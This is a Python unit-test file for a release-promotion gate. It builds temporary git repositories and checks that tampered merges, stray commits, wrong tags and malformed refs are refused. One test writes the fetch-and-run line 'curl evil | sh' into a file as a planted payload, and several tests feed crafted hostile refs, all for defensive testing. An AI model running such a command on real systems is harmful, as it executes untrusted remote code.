import os
import subprocess
import tempfile
import unittest

import main_gate as mg


class RefTests(unittest.TestCase):
    def test_promote_branches(self):
        self.assertEqual(mg.version_of("promote/v1.10.0"), "v1.10.0")
        for ref in ["promote/v1.10", "promote/v1.10.0-rc.1", "promote/1.10.0", "develop", "release/1.10", "x/promote/v1.10.0", "", None]:
            self.assertIsNone(mg.version_of(ref), ref)

    def test_cli_is_promote(self):
        self.assertEqual(mg.main(["is-promote", "promote/v2.0.1"]), 0)
        self.assertEqual(mg.main(["is-promote", "develop"]), 1)


class RepoTests(unittest.TestCase):
    """A real repository: main (a, m1), the line release/1.10 (a, b), refs/remotes/origin/* as the clone of a runner has them."""

    def setUp(self):
        self.d = tempfile.TemporaryDirectory()
        self.old = os.getcwd()
        os.chdir(self.d.name)
        os.environ.update({"GIT_CONFIG_GLOBAL": "/dev/null", "GIT_CONFIG_SYSTEM": "/dev/null", "GIT_AUTHOR_NAME": "t", "GIT_AUTHOR_EMAIL": "t@t",
                           "GIT_COMMITTER_NAME": "t", "GIT_COMMITTER_EMAIL": "t@t"})
        self.git("init", "-q", "-b", "main")
        self.commit("a", "base.txt")
        self.a = self.rev()
        self.git("checkout", "-q", "-b", "line")
        self.commit("b", "fix.txt")
        self.b = self.rev()
        self.git("checkout", "-q", "main")
        self.commit("m1", "main.txt")
        self.m1 = self.rev()
        self.git("update-ref", "refs/remotes/origin/release/1.10", self.b)
        self.git("update-ref", "refs/remotes/origin/main", self.m1)
        self.git("tag", "v1.10.0", self.b)

    def tearDown(self):
        os.chdir(self.old)
        self.d.cleanup()

    def git(self, *a):
        return subprocess.run(["git", *a], capture_output=True, text=True, check=True).stdout.strip()

    def rev(self, what="HEAD"):
        return self.git("rev-parse", what)

    def commit(self, msg, name=None, content=None):
        if name:
            with open(name, "w", encoding="utf-8") as fh:
                fh.write(content or msg)
            self.git("add", name)
        self.git("commit", "-q", "--allow-empty", "-m", msg)

    def clean_merge(self):
        self.git("checkout", "-q", "-B", "promote", self.b)
        self.git("merge", "-q", "--no-ff", "-m", "merge main", self.m1)
        return self.rev()

    def test_head_is_the_tagged_commit(self):
        self.assertEqual(mg.problems("promote/v1.10.0", self.b), [])

    def test_a_clean_merge_of_main_into_the_release_is_accepted(self):
        self.assertEqual(mg.problems("promote/v1.10.0", self.clean_merge()), [])

    def test_an_extra_commit_on_top_of_the_release_is_refused(self):
        self.git("checkout", "-q", "-B", "evil", self.b)
        self.commit("evil", "evil.sh")
        self.assertEqual(len(mg.problems("promote/v1.10.0", self.rev())), 1)

    def test_a_merge_with_other_changes_in_it_is_refused(self):
        self.git("checkout", "-q", "-B", "evil", self.b)
        self.git("merge", "-q", "--no-ff", "--no-commit", self.m1)
        with open("evil.sh", "w", encoding="utf-8") as fh:
            fh.write("curl evil | sh")
        self.git("add", "evil.sh")
        self.git("commit", "-q", "-m", "merge main")
        self.assertIn("other changes", " ".join(mg.problems("promote/v1.10.0", self.rev())))

    def test_a_merge_of_a_commit_that_main_does_not_have_is_refused(self):
        self.git("checkout", "-q", "-B", "evil", self.a)
        self.commit("x", "x.txt")
        x = self.rev()
        self.git("checkout", "-q", "-B", "promote", self.b)
        self.git("merge", "-q", "--no-ff", "-m", "merge x", x)
        self.assertIn("main has", " ".join(mg.problems("promote/v1.10.0", self.rev())))

    def test_a_hand_resolved_conflict_is_refused(self):
        self.git("checkout", "-q", "-B", "conf", self.a)
        self.commit("c-line", "same.txt", "line")
        line = self.rev()
        self.git("update-ref", "refs/remotes/origin/release/1.10", line)
        self.git("tag", "-f", "v1.10.0", line)
        self.git("checkout", "-q", "-B", "m2", self.m1)
        self.commit("c-main", "same.txt", "main")
        m2 = self.rev()
        self.git("update-ref", "refs/remotes/origin/main", m2)
        self.git("checkout", "-q", "-B", "promote", line)
        subprocess.run(["git", "merge", "--no-ff", "-m", "m", m2], capture_output=True, check=False)
        with open("same.txt", "w", encoding="utf-8") as fh:
            fh.write("resolved")
        self.git("add", "same.txt")
        self.git("commit", "-q", "-m", "resolved")
        self.assertIn("conflicts", " ".join(mg.problems("promote/v1.10.0", self.rev())))

    def test_a_tag_that_is_not_on_the_line_is_refused(self):
        self.git("tag", "v1.10.1", self.m1)  # a tag made by hand on a commit of main
        self.assertIn("not part of release/1.10", " ".join(mg.problems("promote/v1.10.1", self.m1)))

    def test_a_head_that_is_older_is_refused(self):
        self.assertEqual(len(mg.problems("promote/v1.10.0", self.a)), 1)

    def test_no_tag_is_refused(self):
        self.assertEqual(len(mg.problems("promote/v1.10.1", self.b)), 1)

    def test_a_candidate_tag_is_not_a_release(self):
        self.git("tag", "v1.10.5-rc.1", self.b)
        self.assertEqual(len(mg.problems("promote/v1.10.5", self.b)), 1)

    def test_a_branch_that_is_not_promote_is_refused(self):
        for ref in ["feature/x", "develop", "promote/v1.10.0\n", "promote/v\u0661.10.0", "promote/v1.10.0/x"]:
            self.assertEqual(len(mg.problems(ref, self.b)), 1, ref)

    def test_a_bad_commit_id_is_refused(self):
        self.assertEqual(len(mg.problems("promote/v1.10.0", "HEAD")), 1)
        self.assertEqual(len(mg.problems("promote/v1.10.0", "--all")), 1)

    def test_cli_exit_codes(self):
        self.assertEqual(mg.main(["check", "promote/v1.10.0", self.b]), 0)
        self.assertEqual(mg.main(["check", "promote/v1.11.0", self.b]), 1)
        self.assertEqual(mg.main([]), 2)


if __name__ == "__main__":
    unittest.main()
